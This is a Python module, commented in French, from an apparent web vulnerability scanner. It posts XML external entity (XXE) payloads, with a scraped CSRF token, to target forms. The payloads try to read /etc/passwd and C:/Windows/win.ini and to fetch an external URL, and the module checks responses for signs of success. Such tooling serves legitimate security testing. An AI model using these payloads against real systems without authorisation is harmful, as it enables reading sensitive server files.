from vulnerabilities.modules.base_module import BaseModule
import requests
from bs4 import BeautifulSoup
import logging

class Module(BaseModule):
    def run(self, context):
        """
        Exécute des tests XXE sur les endpoints spécifiés.
        :param context: Dictionnaire contenant le contexte d'exécution.
        :return: Contexte mis à jour avec les résultats des tests.
        """
        # Récupère les vecteurs XXE à partir du contexte
        xxe_vectors = context.get('xxe_vectors', [])
        module_results = context.setdefault('module_results', [])

        if not xxe_vectors:
            module_results.append({
                'XXE Test': {
                    'message': 'Aucun vecteur XXE à tester. Aucun endpoint compatible trouvé.'
                }
            })
            return context

        # Définir plusieurs payloads pour couvrir différents cas
        payloads = [
            # Payload Linux : tente de lire /etc/passwd
            """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<foo>&xxe;</foo>""",

            # Payload Windows : tente de lire C:\Windows\win.ini
            """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">]>
<foo>&xxe;</foo>""",

            # Payload externe : tente d’accéder à une ressource externe
            """<?xml version="1.0"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://example.com/">]>
<foo>&xxe;</foo>"""
        ]

        # Utiliser une session persistante pour maintenir les cookies (y compris le cookie de session)
        session = requests.Session()

        # Si le contexte contient des cookies de session (après authentification), les ajouter à la session
        if 'session_cookies' in context:
            session.cookies.update(context['session_cookies'])

        for vector in xxe_vectors:
            url = vector.get('url')
            if not url:
                continue

            logging.info(f"[XXE Tester] Test sur URL: {url}")

            for payload in payloads:
                logging.debug(f"[XXE Tester] Payload:\n{payload}\n---")

                try:
                    # Étape 1 : Récupérer la page pour obtenir le token CSRF
                    get_response = session.get(url, timeout=10)
                    if get_response.status_code != 200:
                        module_results.append({
                            'XXE Test': {
                                'url': url,
                                'vulnerable': False,
                                'description': f"Impossible de récupérer la page pour obtenir le token CSRF. Statut HTTP: {get_response.status_code}"
                            }
                        })
                        continue

                    # Étape 2 : Extraire le token CSRF du formulaire
                    soup = BeautifulSoup(get_response.text, 'html.parser')
                    csrf_input = soup.find('input', {'name': 'csrf_token'})
                    if not csrf_input or not csrf_input.get('value'):
                        module_results.append({
                            'XXE Test': {
                                'url': url,
                                'vulnerable': False,
                                'description': "Token CSRF introuvable dans le formulaire."
                            }
                        })
                        continue

                    csrf_token = csrf_input['value']
                    logging.debug(f"[XXE Tester] Token CSRF récupéré: {csrf_token}")

                    # Étape 3 : Préparer les données pour la requête POST
                    post_data = {
                        'csrf_token': csrf_token,
                        'xml_file': payload  # Le champ 'xml_file' correspond au formulaire
                    }

                    # Étape 4 : Envoyer la requête POST avec le payload XXE et le token CSRF
                    post_response = session.post(
                        url,
                        data=post_data,
                        headers={'Content-Type': 'application/x-www-form-urlencoded'},
                        timeout=10
                    )

                    # Analyser la réponse
                    status_code = post_response.status_code
                    content = post_response.text

                    logging.debug(f"[XXE Tester] Réponse HTTP {status_code}, longueur: {len(content)}")

                    # Vérifications des indicateurs de vulnérabilité
                    vulnerability_found = False
                    description = ''

                    # 1. Vérification Linux : présence de "root:" pour /etc/passwd
                    if status_code == 200 and "root:" in content:
                        vulnerability_found = True
                        description = 'Contenu de /etc/passwd détecté dans la réponse.'

                    # 2. Vérification Windows : "[fonts]" apparaît dans win.ini
                    elif status_code == 200 and "[fonts]" in content:
                        vulnerability_found = True
                        description = 'Contenu de win.ini détecté dans la réponse.'

                    # 3. Vérification externe : présence de "example.com" dans la réponse
                    elif status_code == 200 and "example.com" in content:
                        vulnerability_found = True
                        description = 'Accès externe détecté dans la réponse.'

                    # 4. Vérification heuristique : présence de la balise &xxe; non résolue
                    elif "&xxe;" in content:
                        vulnerability_found = True
                        description = 'Entité externe XXE non résolue dans la réponse.'

                    if vulnerability_found:
                        module_results.append({
                            'XXE Test': {
                                'url': url,
                                'vulnerable': True,
                                'description': description
                            }
                        })
                        logging.info(f"[XXE Tester] Vulnérabilité détectée sur {url} : {description}")
                        # Optionnel : arrêter de tester d'autres payloads si vulnérable
                        break
                    else:
                        # Logguer les tentatives infructueuses pour le débogage
                        module_results.append({
                            'XXE Test': {
                                'url': url,
                                'vulnerable': False,
                                'description': 'Aucun signe de XXE dans la réponse.',
                                'response_preview': content[:200]  # Pour aider au débogage
                            }
                        })
                        logging.info(f"[XXE Tester] Aucun signe de XXE détecté sur {url}.")

                except requests.RequestException as e:
                    # En cas d'erreur de requête, logguer l'erreur
                    module_results.append({
                        'XXE Test': {
                            'url': url,
                            'vulnerable': False,
                            'error': f"Erreur de requête: {str(e)}"
                        }
                    })
                    logging.error(f"[XXE Tester] Erreur lors du test sur {url} : {str(e)}")

        return context
